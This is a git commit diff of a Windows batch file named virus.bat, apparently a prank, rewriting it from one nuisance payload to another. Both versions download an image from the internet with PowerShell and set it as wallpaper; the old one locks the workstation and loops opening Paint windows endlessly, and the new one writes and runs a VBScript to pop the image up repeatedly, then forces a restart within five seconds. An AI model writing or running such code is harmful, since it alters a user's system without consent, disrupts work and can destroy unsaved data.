66bc8e7bda59be33941bde61b401275325a32bd2
tlochsta <81081702+tlochsta@users.noreply.github.com>
2024-08-27 19:42:58 -0400

    Update virus.bat

--- virus.bat
+++ virus.bat
@@ -1,23 +1,25 @@
 @echo off
-title silly billy
-color 0A
-cls
-echo silly billy virus, answer the question that it asks lil bro
-echo MsgBox "are u the skibidi rizzler?", 4+32, "sillybilly" > %temp%\confirm.vbs
-cscript //nologo %temp%\confirm.vbs >nul
-del %temp%\confirm.vbs
+setlocal
 
-set "imageUrl=https://media.tenor.com/Qfz661n_2SAAAAAe/yellow-emoji-funny.png"
-set "imagePath=%temp%\fun_image.jpg"
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%imageUrl%', '%imagePath%')"
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imagePath%" /f
-RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True
-powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class LockScreen { [DllImport(\"user32.dll\")] public static extern void LockWorkStation(); }'; LockScreen::LockWorkStation()"
-powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name ColorPrevalence -Value 1"
-powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0"
-:spamloop
-start "" "%SystemRoot%\System32\mspaint.exe" "%imagePath%"
-timeout /nobreak /t 1 >nul
-goto spamloop
-echo skibidi
-pause
+set "image_url=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCV6qQJQSarzA33VS0l8y_9-oQhX7WkJXLsg&s"
+set "image_path=%TEMP%\downloaded_image.jpg"
+
+powershell -Command "Invoke-WebRequest -Uri %image_url% -OutFile %image_path%"
+
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%image_path%" /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\custom_windows.vbs"
+echo Set objShell = CreateObject("Shell.Application") >> "%TEMP%\custom_windows.vbs"
+echo Set imgFile = "%image_path%" >> "%TEMP%\custom_windows.vbs"
+echo Randomize >> "%TEMP%\custom_windows.vbs"
+echo For i = 1 To 20 >> "%TEMP%\custom_windows.vbs"
+echo     XPos = Int((Screen.Width - 300) * Rnd) >> "%TEMP%\custom_windows.vbs"
+echo     YPos = Int((Screen.Height - 300) * Rnd) >> "%TEMP%\custom_windows.vbs"
+echo     Set objWindow = objShell.ShellExecute imgFile, "", "", "open", 1 >> "%TEMP%\custom_windows.vbs"
+echo     WScript.Sleep 500 >> "%TEMP%\custom_windows.vbs"
+echo Next >> "%TEMP%\custom_windows.vbs"
+
+cscript //nologo "%TEMP%\custom_windows.vbs"
+shutdown /r /t 5
+echo hello skibidi > "%userprofile%\Desktop\hello_skibidi.txt"
